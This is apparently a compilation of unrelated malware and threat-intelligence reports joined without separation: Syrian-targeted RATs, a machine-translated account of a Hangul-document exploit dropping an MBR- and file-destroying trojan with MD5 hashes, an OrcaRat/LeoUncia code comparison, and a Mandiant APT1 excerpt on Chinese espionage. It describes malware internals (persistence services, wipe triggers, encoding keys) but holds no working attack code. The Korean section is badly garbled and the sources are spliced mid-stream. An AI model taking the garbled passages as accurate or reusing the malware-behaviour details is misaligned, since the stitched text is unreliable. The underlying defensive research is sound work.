In our research we were able to collect more than 100 malware samples used to attack Syrian citizens .
Although most of these samples are known , cybercriminals rely on a plethora of obfuscation tools and techniques in order to change the malware structure so as to bypass signature scanning and avoid antivirus detection .
This proves how critical heuristic technologies are when it comes to protecting against these types of attack .
By being able to identify variants of known malware types or even new malware families , Kaspersky Lab security products detected all the collected samples .
We expect these attacks to continue and evolve both in quality and quantity .
We expect the attackers to start using more advanced techniques to distribute their malware , using malicious documents or drive - by download exploits .
With enough funding and motivation they might also be able to get access to zero day vulnerabilities , which will make their attacks more effective and allow them to target more sensitive or high profile victims .
Even though the attackers depend mainly on using known RATs , their rapid improvement and application of obfuscation techniques , GUI development for fake applications , and code modification via automated builders , increase the probability that it wo n't be too long before they start writing their own Trojans to take advantage of customized infection capabilities and implement better security evasion .
Finally , having a comprehensive and up - to - date antivirus and firewall should be the first measure taken by any user that does any type of online activity , especially during these uncertain times when new cyber threats appear almost daily .
The list of sample files has been collected through the infection vectors detailed above ( Skype , Facebook , file - sharing , email , etc . ) .
The samples have been either generated using automated tools ( RAT server , obfuscation tools ) or developed and bound to RAT files , especially the new samples with graphical content .
The following is a list of domains and corresponding IP addresses used in the attacks .
Vulnerabilities recently received a file with the destruction and MBR destruction capabilities for major extension to the existing file in addition to the backdoor functionality that existed in Hangul document file is received attention is required .
December 9 , 2014 received the first vulnerability Hangul document files were used for both groups known vulnerabilities , patching does not work on the latest products .
Total of 9 document file has been received , and all of the same malicious file therein .
% System % registered the generated DLL as a service to the folder / drive upon , information that is used has a list on the inside of malicious code , and select one of the items below at random .
- BDESVC hosts the BitLocker Drive Decryption service .
- Provides network address Translation , Addressing , name resolution and / or Intrusion Prevention Services for a home or Small Office network .
- Allows Media Center to Locate and Connect to the Computer .
- This service Delivers network Notifications ( E. - Enables Multi - party using Peer - to - Peer Communication Connecting .
- This service publishes a machine name using the Peer Name Resolution Protocol .
- MANAGES power policy and power policy Delivery Notification .
- This service Provides Support for the Program Compatibility Assistant ( PCA ) .
- Enables remote users to modify Registry configurations on this Computer .
- Access to Smart Cards MANAGES read by this Computer .
- Enables Tablet PC Ink PEN and functionality - Enables a user to Configure and Schedule Automated tasks on this Computer .
- Provides Execution ordered for a Group of threads within a specific period of time .
- Enables Windows - based Programs to create , Access , and modify Internet- Files based .
- The service hosts third - party WcasPlugInService Windows Color System color and gamut map Device Model Model Plug - in modules .
- Enables Installation , modification , and Removal of Windows updates and Optional Components .
- Maintains date and time Synchronization on all clients and Servers in the network .
- The Wired AutoConfig ( dot3svc ) service is responsible for Performing IEEE 802.1X - The WLANSVC service Logic Provides the Required to Configure , Discover , Connect to , and disconnect from a Wireless local Area network .
- Creates and maintains client network connections to remote server using the SMB protocol MBR destruction is done through a ' number ' value of the registry key value of the items checked below ( `` 0 '' if the destructive behavior than the largest value ) is set to ' 0 ' value at the time of initial infection .
The following [ Figure 1 ] shows the contents of the registry key ' PcaSvcc ' items registered by the malware .
MBR destruction operations to determine the value of number entry through the time information of the user 's system after December 10 , 2014 11:00 a.m. when a , is set to non - zero value is , the MBR is destroyed feature to work .
In [ Figure 2 ] shows a code section that compares the time information for determining a destruction inside MBR infection .
Malicious code stored in the internal `` 0x780D0C33 '' value and the operation to compare the time information through a specific operation of the system time obtained by the GetLocalTime function call can be seen that true .
MBR destruction is overwritten for the 0x200 ( 512 bytes ) , it can be seen the data filled in as shown in [ Figure 3 ] below .
Infection , ' A ' ~ ' Z ' , the same process is repeated for all the drives .
The following [ Figure 4 ] is overwritten with the contents of the MBR code , and has the ability to output the string during boot `` Who Am I ? '' .
The following [ Figure 5 ] After MBR infection , a screen visible to the user reboots .
Malicious code can destroy the functionality of a file having a particular extension in addition to destruction together also has functions for the MBR .
Destroy the target file identified to date are : Locate the files with the extension of the above ' A ' ~ ' Z ' drive changes and performs a process to fill a NULL value to 4096 bytes ( 4 K ) size .
Received nine vulnerabilities Hangul document and the contents hereof are both used the same vulnerability varies .
In [ Figure 6 ] shows the portion of the shell part and the operation code for generating a vulnerability .
The layout of paragraphs in Hangul document and vulnerability occurs in the course of processing the part that is responsible ( ' HWPTAG_PARA_LINE_SEG ' ) and , shellcode ( ShellCode ) and heap spray insert a paragraph of text for ( Heap Spray ) ( ' HWPTAG_PARA_TEXT ' ) is used was .
MD5 and V3 diagnostic information on malicious files identified vulnerability Hangul file and generated by the current is as follows .
- 54783422cfd7029a26a3f3f5e9087d8a ( V3 : HWP / Exploit , 2014.12.10.06 ) - b5b6e93ab27cec75f07af2a3a6a40926 ( V3 : HWP / Exploit , 2014.12.10.02 ) - 800866bbab514657969996210bcf727b ( V3 : HWP / Exploit , 2014.12.10.02 ) - ead682b889218979b1f2f1527227af9b ( V3 : HWP / Exploit , 2014.12 .
10.02 ) - f09ea2a841114121f32211faac553e1b ( V3 : HWP / Exploit , 2014.12.09.06 ) - 9daf088fe4c9a9580216e98dbb7d1fca ( V3 : HWP / Exploit , 2014.12.09.06 ) - 3ec69ee7135272e5bed3ea5378ade6ee ( V3 : HWP / Exploit , 2014.12.11.05 ) - 33874577bf54d3c209925c9def880eb9 ( V3 : HWP / Exploit , 2014.12.11.05 ) - af792a34548a2038f034ea9a6ff0639a ( V3 : HWP / Exploit , 2014.12.11.05 ) - 3BA8A6815F828DFC518A0BDBD27BBA5B ( V3 : Trojan / Win32.Destroyer , 2014.12.10.00 ) In order to prevent a malware infection is necessary to always maintain a Hangul program , and program - to - date antivirus update state .
In addition , the vulnerability has been identified as Hangul document files are disseminated in the form of a person to e - mail attachments .
For unascertained sender or unresolved attachment , the procedure to ensure that there is no problem in security is required before execution .
The PWC - named malware OrcaRat is presented as a new piece of malware but looking at the URI used for C & C communication , it could be an updated version of a well- known and kind of old piece of malware : LeoUncia .
Let 's face it : It looks a lot like : What about it ? Could it be the same kind of things , huh ? Let 's dig a little deeper inside the code to check if it is just some sort of coincidence or if it is indeed the same code that is behind these two pieces of malware .
PWC explain it pretty well : the URI is made of some sort of Base64-encoded strings with the middle one being the seed to be associated to the master key to decrypt the whole thing .
Actually : and to obtain Di ( the original data that gives us Ei once encrypted ) , we must perform the following operation : where master_key is `` OrcaKiller '' for the OrcaRat sample .
What can we find in LeoUncia that is to be found in OrcaRat too ? First , let 's have a look at the URI decryption routine .
Dealing with OrcaRat , we have seen the following algorithm : When we talk about LeoUncia , we can have a look at the blog posts made by FireEye back in December 2010 , especially the second one , where some assembly code has been screenshot from IDA without ever giving the name of the underlying algorithm : yes , it is RC4 ! Once decoded from Base64 , the binary data we obtain from the URI is comprised of two parts : the first 16 bytes are the decryption key , and the rest of the data is the information to be decrypted .
Putting back pieces together , we have the following algorithm for LeoUncia : The two samples both share a `` custom '' Base64 encoding with the use of RC4 ; nothing fabulous , but it is a start .
We dig further with the encoding algorithm : the so - called `` custom '' Base64 .
In both case , the first goal of the customization is to avoid the presence of some `` / '' in any encoded data , because it would break down the process of cutting the URI along with the `` / '' separator .
For LeoUncia , the Base64 being used is the Base64-URI that replaces `` + '' and `` / '' by `` .
'' and `` _ '' , while for OrcaRat , `` + '' are kept and `` / '' are replaced by `` ~ '' .
Additionally , OrcaRat authors thought it would be great if the URI was a little less obviously Base64-related .
So , rather than splitting every eight characters to avoid having '' = '' in the URI , they decided that replacing the endings `` = '' in `` = 1 '' and `` = = '' in `` = 2 '' would be a great improvement .
Let 's have a look at one of the feature of LeoUncia : the hibernate feature .
The feature does the same in OrcaRat : check for some date and time written in a file , and sleep for as long as needed before deleting the aforementioned file .
( We would also notice that an useless call to FileTimeToSystemTime has been removed meanwhile .
) The real difference lies in the obfuscation of the filename : LeoUncia was using a plain - text filename ( `` readx '' ) , whereas OrcaRat is obfuscating ( just the same way it obfuscates the Campaign ID ) this data : the filename is `` wbt.dat '' ( obfuscated string XORed character - by - character with the XOR key `` product '' ) and it is located in the `` App Data '' folder of the user OrcaRat is running with .
Finally , let 's look at the debug strings we can find in the binaries .
The LeoUncia sample studied by FireEye includes a perfect English string : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' Unfortunately , we can not find this string in the OrcaRat sample .
Bad luck ...
But when we look at a more recent sample of LeoUncia , we have one with the above string and two other interesting strings : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' `` \r\nReturnTime Set Error ! \r\n '' `` \r\nReturnTime set success ! \r\n '' These two strings are linked to the writing in the hibernation file , and indicates to the C & C manager that its command either succeeded or failed .
That is very interesting because the OrcaRat sample is also using some very similar debug strings to notify its C & C about the hibernate command : `` \r\nSet return time error = % d ! \r\n '' `` \r\nSet return time success ! \r\n '' And yes , it is always easier to debug your code when you know the error code ; that 's an improvement ! These two families are most likely linked in the sense that OrcaRat is a nicely updated version of LeoUncia .
`` China 's economic espionage has reached an intolerable level and I believe that the United States and our allies in Europe and Asia have an obligation to confront Beijing and demand that they put a stop to this piracy .
Beijing is waging a massive trade war on us all , and we should band together to pressure them to stop .
Combined , the United States and our allies in Europe and Asia have significant diplomatic and economic leverage over China , and we should use this to our advantage to put an end to this scourge .
'' - U.S. Rep. Mike Rogers , October , 2011 `` It is unprofessional and groundless to accuse the Chinese military of launching cyber attacks without any conclusive evidence .
'' - Chinese Defense Ministry , January , 2013 Since 2004 , Mandiant has investigated computer security breaches at hundreds of organizations around the world .
The majority of these security breaches are attributed to advanced threat actors referred to as the `` Advanced Persistent Threat '' ( APT ) .
We first published details about the APT in our January 2010 M - Trends report .
As we stated in the report , our position was that `` The Chinese government may authorize this activity , but there 's no way to determine the extent of its involvement .
'' Now , three years later , we have the evidence required to change our assessment .
The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them .
Mandiant continues to track dozens of APT groups around the world ; however , this report is focused on the most prolific of these groups .
We refer to this group as `` APT1 '' and it is one of more than 20 APT groups with origins in China .
APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006 .
From our observations , it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen .
The scale and impact of APT1 's operations compelled us to write this report .
The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted .
Though our visibility of APT1 's activities is incomplete , we have analyzed the group 's intrusions against nearly 150 victims over seven years .
From our unique vantage point responding to victims , we tracked APT1 back to four large networks in Shanghai , two of which are allocated directly to the Pudong New Area .
We uncovered a substantial amount of APT1 's attack infrastructure , command and control , and modus operandi ( tools , tactics , and procedures ) .
In an effort to underscore there are actual individuals behind the keyboard , Mandiant is revealing three personas we have attributed to APT1 .
These operators , like soldiers , may merely be following orders given to them by others .
Our analysis has led us to conclude that APT1 is likely government - sponsored and one of the most persistent of China 's cyber threat actors .
We believe that APT1 is able to wage such a long - running and extensive cyber espionage campaign in large part because it receives direct government support .
In seeking to identify the organization behind this activity , our research found that People 's Liberation Army ( PLA 's ) Unit 61398 is similar to APT1 in its mission , capabilities , and resources .
PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate .
APT1 is believed to be the 2nd Bureau of the People 's Liberation Army ( PLA ) General Staff Department 's ( GSD ) 3rd Department ( 总参三部二局 ) , which is most commonly known by its Military Unit Cover Designator ( MUCD ) as Unit 61398 ( 61398部队 ) .
» » The nature of `` Unit 61398 's '' work is considered by China to be a state secret ; however , we believe it engages in harmful `` Computer Network Operations .
'' » » Unit 61398 is partially situated on Datong Road ( 大同路 ) in Gaoqiaozhen ( 高桥镇 ) , which is located in the Pudong New Area ( 浦东新区 ) of Shanghai ( 上海 ) .
The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007 .
» » We estimate that Unit 61398 is staffed by hundreds , and perhaps thousands of people based on the size of Unit 61398 's physical infrastructure .
» » China Telecom provided special fiber optic communications infrastructure for the unit in the name of national defense .
» » Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be proficient in the English language .
» » Mandiant has traced APT1 's activity to four large networks in Shanghai , two of which serve the Pudong New Area where Unit 61398 is based .
APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations , and has demonstrated the capability and intent to steal from dozens of organizations simultaneously .
» » Since 2006 , Mandiant has observed APT1 compromise 141 companies spanning 20 major industries .
» » APT1 has a well - defined attack methodology , honed over years and designed to steal large volumes of valuable intellectual property .
» » Once APT1 has established access , they periodically revisit the victim 's network over several months or years and steal broad categories of intellectual property , including technology blueprints , proprietary manufacturing processes , test results , business plans , pricing documents , partnership agreements , and emails and contact lists from victim organizations ' leadership .
» » APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email - GETMAIL and MAPIGET .
» » APT1 maintained access to victim networks for an average of 356 days .
The longest time period APT1 maintained access to a victim 's network was 1,764 days , or four years and ten months .
» » Among other large - scale thefts of intellectual property , we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten - month time period .
» » In the first month of 2011 , APT1 successfully compromised at least 17 new victims operating in 10 different industries .
APT1 focuses on compromising organizations across a broad range of industries in English - speaking countries .
» » Of the 141 APT1 victims , 87 % of them are headquartered in countries where English is the native language .
» » The industries APT1 targets match industries that China has identified as strategic to their growth , including four of the seven strategic emerging industries that China identified in its 12th Five Year Plan .
APT1 maintains an extensive infrastructure of computer systems around the world .
» » APT1 controls thousands of systems in support of their computer intrusion activities .
» » In the last two years we have observed APT1 establish a minimum of 937 Command and Control ( C2 ) servers hosted on 849 distinct IP addresses in 13 countries .
The majority of these 849 unique IP addresses were registered to organizations in China ( 709 ) , followed by the U.S. ( 109 ) .
» » In the last three years we have observed APT1 use fully qualified domain names ( FQDNs ) resolving to 988 unique IP addresses .
» » Over a two - year period ( January 2011 to January 2013 ) we confirmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop , a tool that provides a remote user with an interactive graphical interface to a system .
» » In the last several years we have confirmed 2,551 FQDNs attributed to APT1 .
In over 97 % of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure , APT1 used IP addresses registered in Shanghai and systems set to use the Simplified Chinese language .
» » In 1,849 of the 1,905 ( 97 % ) of the Remote Desktop sessions APT1 conducted under our observation , the APT1 operator 's keyboard layout setting was `` Chinese ( Simplified ) - US Keyboard '' .
Microsoft 's Remote Desktop client configures this setting automatically based on the selected language on the client system .
Therefore , the APT1 attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts .
» » 817 of the 832 ( 98 % ) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China .
» » We observed 767 separate instances in which APT1 intruders used the `` HUC Packet Transmit Tool '' or HTRAN to communicate between 614 distinct routable IP addresses and their victims ' systems using their attack infrastructure .
Of the 614 distinct IP addresses used for HTRAN communications : −− 614 of 614 ( 100 % ) were registered in China .
−− 613 ( 99.8 % ) were registered to one of four Shanghai net blocks .
The size of APT1 's infrastructure implies a large organization with at least dozens , but potentially hundreds of human operators .
» » We conservatively estimate that APT1 's current attack infrastructure includes over 1,000 servers .
» » Given the volume , duration and type of attack activity we have observed , APT1 operators would need to be directly supported by linguists , open source researchers , malware authors , industry experts who translate task requests from requestors to the operators , and people who then transmit stolen information to the requestors .
» » APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment , people who handle finances , facility management , and logistics ( e.g. , shipping ) .
In an effort to underscore that there are actual individuals behind the keyboard , Mandiant is revealing three personas that are associated with APT1 activity .
» » The first persona , `` UglyGorilla '' , has been active in computer network operations since October 2004 .
His activities include registering domains attributed to APT1 and authoring malware used in APT1 campaigns .
`` UglyGorilla '' publicly expressed his interest in China 's `` cyber troops '' in January 2004 .
» » The second persona , an actor we call `` DOTA '' , has registered dozens of email accounts used to conduct social engineering and spear phishing attacks in support of APT1 campaigns .
`` DOTA '' used a Shanghai phone number while registering these accounts .
» » We have observed both the `` UglyGorilla '' persona and the `` DOTA '' persona using the same shared infrastructure , including FQDNs and IP ranges that we have attributed to APT1 .
» » The third persona , who uses the nickname `` SuperHard , '' is the creator or a significant contributor to the AURIGA and BANGAT malware families which we have observed APT1 and other APT groups use .
`` SuperHard '' discloses his location to be the Pudong New Area of Shanghai .
Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations .
» » Specifically , Mandiant is providing the following : −− Digital delivery of over 3,000 APT1 indicators , such as domain names , IP addresses , and MD5 hashes of malware .
−− Sample Indicators of Compromise ( IOCs ) and detailed descriptions of over 40 families of malware in APT1 's arsenal of digital weapons .
−− Thirteen ( 13 ) X.509 encryption certificates used by APT1 .
−− A compilation of videos showing actual attacker sessions and their intrusion activities .
» » While existing customers of Mandiant 's enterprise - level products , Mandiant Managed Defense and Mandiant Intelligent Response® , have had prior access to these APT1 Indicators , we are also making them available for use with Redline™ , our free host - based investigative tool .
Redline can be downloaded at http : //www.mandiant.com/ resources / download / redline .
The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified group based in China leaves little doubt about the organization behind APT1 .
We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398 .
However , we admit there is one other unlikely possibility : A secret , resourced organization full of mainland Chinese speakers with direct access to Shanghai - based telecommunications infrastructure is engaged in a multi - year , enterprise scale computer espionage campaign right outside of Unit 61398 's gates , performing tasks similar to Unit 61398 's known mission .
The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one .
What started as a `` what if '' discussion about our traditional non - disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group .
It is time to acknowledge the threat is originating in China , and we wanted to do our part to arm and prepare security professionals to combat that threat effectively .
The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage .
Without establishing a solid connection to China , there will always be room for observers to dismiss APT actions as uncoordinated , solely criminal in nature , or peripheral to larger national security and global economic concerns .
We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches .
At the same time , there are downsides to publishing all of this information publicly .
Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them .
Additionally , publishing certain kinds of indicators dramatically shortens their lifespan .
When Unit 61398 changes their techniques after reading this report , they will undoubtedly force us to work harder to continue tracking them with such accuracy .
It is our sincere hope , however , that this report can temporarily increase the costs of Unit 61398 's operations and impede their progress in a meaningful way .
We are acutely aware of the risk this report poses for us .
We expect reprisals from China as well as an onslaught of criticism .
Our research and observations indicate that the Communist Party of China ( CPC , 中国共产党 ) is tasking the Chinese People 's Liberation Army ( PLA , 中国人民解放军 ) to commit systematic cyber espionage and data theft against organizations around the world .
This section provides photos and details of Unit 61398 facilities , Chinese references discussing the unit 's training and coursework requirements , and internal Chinese communications documenting the nature of the unit 's relationship with at least one state - owned enterprise .
These details will be particularly relevant when we discuss APT1 's expertise , personnel , location , and infrastructure , which parallel those of Unit 61398 .
The PLA 's cyber command is fully institutionalized within the CPC and able to draw upon the resources of China 's state- owned enterprises to support its operations .
The CPC is the ultimate authority in Mainland China ; unlike in Western societies , in which political parties are subordinate to the government , the military and government in China are subordinate to the CPC .
In fact , the PLA reports directly to the CPC 's Central Military Commission ( CMC , 中央军事委 员会 ) .
This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC .
We believe that the PLA 's strategic cyber command is situated in the PLA 's General Staff Department ( GSD , 总参谋 部 ) , specifically its 3rd Department ( 总参三部 ) .
The GSD is the most senior PLA department .
Similar to the U.S. Joint Chiefs of Staff , the GSD establishes doctrine and provides operational guidance for the PLA .
Within the GSD , the 3rd Department has a combined focus on signals intelligence , foreign language proficiency , and defense information systems .
It is estimated to have 130,000 personnel divided between 12 bureaus ( 局 ) , three research institutes , and 16 regional and functional bureaus .
We believe that the GSD 3rd Department , 2nd Bureau ( 总参三部二局 ) , is the APT group that we are tracking as APT1 .
Figure 1 shows how close the 2nd Bureau sits to the highest levels of the CPC .
At this level , the 2nd Bureau also sits atop a large - scale organization of subordinate offices .
Publicly available references confirm that the PLA GSD 's 3rd Department , 2nd Bureau , is Military Unit Cover Designator ( MUCD ) 61398 , more commonly known as Unit 61398 .
They also clearly indicate that Unit 61398 is tasked with computer network operations ( CNO ) .
The Project 2049 Institute reported in 2011 that Unit 61398 `` appears to function as the Third Department 's premier entity targeting the United States and Canada , most likely focusing on political , economic , and military - related intelligence .
'' Our research supports this and also suggests Unit 61398 's CNO activities are not limited to the U.S. and Canada , but likely extend to any organization where English is the primary language .
Chinese military units are given MUCDs , five - digit numerical sequences , to provide basic anonymity for the unit in question and as a standardized reference that facilitates communications and operations ( e.g. , `` Unit 81356 is moving to the objective , '' versus `` 1st Battalion , 125th Regiment , 3rd Division , 14th Group Army is moving to the objective '' ) .
Military Unit Cover Designators are also used in official publications and on the Internet to refer to the unit in question .
The MUCD numbers are typically displayed outside a unit 's barracks , as well as on the unit 's clothing , flags , and stationary .
Source : The Chinese Army Today : Tradition and Transformation for the 21st Century - Dennis J. Blasko The care with which the PLA maintains the separation between the GSD 3rd Department , 2nd Bureau , and the MUCD 61398 can be partially observed by searching the Internet for official documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398 .
Figure 2 shows the results of one of these queries .
Despite our challenges finding a link between the Chinese Government and Unit 61398 online , our searches did find references online indicating that the GSD 3rd Department , 2nd Bureau , is actually Unit 61398 .
Specifically , Google indexed references to Unit 61398 in forums and resumes .
Once these references were discovered by CPC censors , these postings and documents were likely modified or removed from the Internet .
Figure 3 shows Google search results for unit 61398 and some responsive `` hits '' ( note that the links that appear in these search results will likely have been removed by the time you read this report ) : Unit 61398 appears to be actively soliciting and training English speaking personnel specializing in a wide variety of cyber topics .
Former and current personnel from the unit have publicly alluded to these areas of emphasis .
For example , a graduate student of covert communications , Li Bingbing ( 李兵兵 ) , who openly acknowledged his affiliation with Unit 61398 , published a paper in 2010 that discussed embedding covert communications within Microsoft® Word documents .
Another example is English linguist Wang Weizhong 's ( 王卫忠 ) biographical information , provided to the Hebei ( 河北 ) Chamber of Commerce , which describes the training he received as an English linguist while assigned to Unit 61398 .
These and other examples that demonstrate Unit 61398 's areas of expertise are listed in Table 1 below .
Additionally , there is evidence that Unit 61398 aggressively recruits new talent from the Science and Engineering departments of universities such as Harbin Institute of Technology ( 哈尔滨工业大学 ) and Zhejiang University School of Computer Science and Technology ( 浙江大学计算机学院 ) .
The majority of the `` profession codes '' ( 专业代码 ) describing positions that Unit 61398 is seeking to fill require highly technical computer skills .
The group also appears to have a frequent requirement for strong English proficiency .
Table 2 provides two examples of profession codes for positions in Unit 61398 , along with the required university courses and proficiencies associated with each profession .
Based on the size of Unit 61398 's physical infrastructure , we estimate that the unit is staffed by hundreds , and perhaps thousands .
This is an extrapolation based on public disclosures from within China describing the location and physical installations associated with Unit 61398 .
For example , public sources confirm that in early 2007 , Jiangsu Longhai Construction Engineering Group ( 江苏龙海建工集团有限公司 ) completed work on a new building for Unit 61398 located at Datong Road 208 within the Pudong New Area of Shanghai ( 上海市浦东新区高桥镇大同路208号 ) , which is referred to as the `` Unit 61398 Center Building '' ( 61398部队中心大楼 ) .
At 12 stories in height , and offering 130,663 square feet of space , we estimate that this building houses offices for approximately 2,000 people .
Figure 4 through Figure 7 provide overhead views and street - level views of the building and its location , showing its size .
This is only one of the unit 's several buildings , some of which are even larger .
Unit 61398 also has a full assortment of support units and associated physical infrastructure , much of which is located on a stretch of Datong Road ( 大同路 ) in Gaoqiaozhen ( 高桥镇 ) , in the Pudong New Area ( 浦东新区 ) of Shanghai ( 上 海 ) .
These support units include a logistics support unit , outpatient clinic , and kindergarten , as well as guesthouses located both in Gaoqiaozhen and in other locations in Shanghai .
These amenities are usually associated with large military units or units at higher echelons .
The close proximity of these amenities supports the contention that Unit 61398 occupies a high - level position in the PLA organizational hierarchy ( see Figure 1 : Unit 61398 's positions within the PLA ) .
Mandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398 .
The memo ( in Figure 8 ) reveals China Telecom executives deciding to `` co - build '' with Unit 61398 to justify the use of their own inventory in the construction of fiber optic communication lines `` based on the principle that national defense construction is important .
'' The letter also appears to indicate that this is a special consideration being made outside of China Telecom 's `` normal renting method '' for Unit 61398 .
Additionally , the memo clarifies the phrase '' Unit 61398 '' with the comment `` ( GSD 3rd Department , 2nd Bureau ) .
'' The memo not only supports the identity of Unit 61398 as GSD 's 3rd Department 2nd Bureau , but also reveals the relationship between a `` very important communication and control department '' ( Unit 61398 ) and a state - influenced enterprise .
The evidence we have collected on PLA Unit 61398 's mission and infrastructure reveals an organization that : » » Employs hundreds , perhaps thousands of personnel » » Requires personnel trained in computer security and computer network operations » » Requires personnel proficient in the English language » » Has large - scale infrastructure and facilities in the `` Pudong New Area '' of Shanghai » » Was the beneficiary of special fiber optic communication infrastructure provided by state - owned enterprise China Telecom in the name of national defense The following sections of this report detail APT1 's cyber espionage and data theft operations .
The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign .
We will demonstrate that the nature of APT1 's targeted victims and the group 's infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398 .
Our evidence indicates that APT1 has been stealing hundreds of terabytes of data from at least 141 organizations across a diverse set of industries beginning as early as 2006 .
Remarkably , we have witnessed APT1 target dozens of organizations simultaneously .
Once the group establishes access to a victim 's network , they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property , including technology blueprints , proprietary manufacturing processes , test results , business plans , pricing documents , partnership agreements , emails and contact lists from victim organizations ' leadership .
We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has committed .
Since 2006 we have seen APT1 relentlessly expand its access to new victims .
Figure 10 shows the timeline of the 141 compromises we are aware of ; each marker in the figure represents a separate victim and indicates the earliest confirmed date of APT1 activity in that organization 's network .
With the ephemeral nature of electronic evidence , many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1 's presence in the network .
Once APT1 has compromised a network , they repeatedly monitor and steal proprietary data and communications from the victim for months or even years .
For the organizations in Figure 10 , we found that APT1 maintained access to the victim 's network for an average of 356 days .
The longest time period APT1 maintained access to a victim 's network was at least 1,764 days , or four years and ten months .
APT1 was not continuously active on a daily basis during this time period ; however , in the vast majority of cases we observed , APT1 continued to commit data theft as long as they had access to the network .
The organizations targeted by APT1 primarily conduct their operations in English .
However , we have also seen the group target a small number of non - English speaking victims .
A full 87 % of the APT1 victims we have observed are headquartered in countries where English is the native language ( see Figure 11 ) .
This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom .
Of the remaining 19 victims , 17 use English as a primary language for operations .
These include international cooperation and development agencies , foreign governments in which English is one of multiple official languages , and multinational conglomerates that primarily conduct their business in English .
Only two victims appear to operate using a language other than English .
Given that English- language proficiency is required for many members of PLA Unit 61398 , we believe that the two non - English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities .
APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously .
Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified , organized by the 20 major industries they represent .
The results suggest that APT1 's mission is extremely broad ; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis .
Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly , the range of industries that APT1 targets may be even broader than our findings suggest .
Further , the scope of APT1 's parallel activities implies that the group has significant personnel and technical resources at its disposal .
In the first month of 2011 , for example , Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries .
Since we have seen that the group remains active in each victim 's network for an average of nearly a year after the initial date of compromise , we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims .
We believe that organizations in all industries related to China 's strategic priorities are potential targets of APT1 's comprehensive cyber espionage campaign .
While we have certainly seen the group target some industries more heavily than others ( see Figure 13 ) , our observations confirm that APT1 has targeted at least four of the seven strategic emerging industries that China identified in its 12th Five Year Plan .
APT1 steals a broad range of information from its victims .
The types of information the group has stolen relate to : » » product development and use , including information on test results , system designs , product manuals , parts lists , and simulation technologies ; » » manufacturing procedures , such as descriptions of proprietary processes , standards , and waste management processes ; » » business plans , such as information on contract negotiation positions and product pricing , legal events , mergers , joint ventures , and acquisitions ; » » policy positions and analysis , such as white papers , and agendas and minutes from meetings involving high- ranking personnel ; » » emails of high - ranking employees ; and » » user credentials and network architecture information .
It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons : » » APT1 deletes the compressed archives after they pilfer them , leaving solely trace evidence that is usually overwritten during normal business activities .
» » Pre - existing network security monitoring rarely records or identifies the data theft .
» » The duration of time between the data theft and Mandiant 's investigation is often too great , and the trace evidence of data theft is overwritten during the normal course of business .
» » Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach .
Even with these challenges , we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten - month time period .
Given the scope of APT1 's operations , including the number of organizations and industries we have seen them target , along with the volume of data they are clearly capable of stealing from any single organization , APT1 has likely stolen hundreds of terabytes from its victims .
Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data , we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state - owned enterprises .
As an example , in 2008 , APT1 compromised the network of a company involved in a wholesale industry .
APT1 installed tools to create compressed file archives and to extract emails and attachments .
Over the following 2.5 years , APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives , including the CEO and General Counsel .
During this same time period , major news organizations reported that China had successfully negotiated a double - digit decrease in price per unit with the victim organization for one of its major commodities .
This may be coincidental ; however , it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group 's efforts were not finding their way into the hands of entities able to capitalize on them .
Public reporting corroborates and extends our observations of APT1 's cyber espionage activity .
However , several factors complicate the process of compiling and synthesizing public reports on APT1 .
For one thing , information security researchers and journalists refer to APT1 by a variety of names .
In addition , many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them .
To assist researchers in identifying which public reports describe the threat group that we identify as APT1 , Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not .
